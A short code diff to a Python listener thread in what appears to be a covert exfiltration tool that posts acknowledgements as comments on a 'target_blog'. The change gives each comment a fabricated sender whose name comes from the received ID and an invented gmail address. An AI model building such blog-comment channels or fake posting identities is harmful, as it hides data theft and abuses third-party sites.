@@ -56,8 +56,10 @@ def thread_start_listener():
             f.close()
 
             comment = Comment()
-            comment.sender = sender
+            comment.sender = Sender()
             comment.comment = exfil_content.split(":")[0]
+            comment.sender.name = comment.comment
+            comment.sender.email = comment.comment.lower() + "@gmail.com"
             log_print("[INFO " + str(datetime.datetime.utcnow()) + "] thread_start_listener: Received comment with ID " + comment.comment + ". Sending acknowledgement...", 1)
             response = submit_comment(channel.target_blog, channel.ack_channel_id, comment)
             log_print("## " + str(response.html_response_code) + ", " + response.html_response, 2)
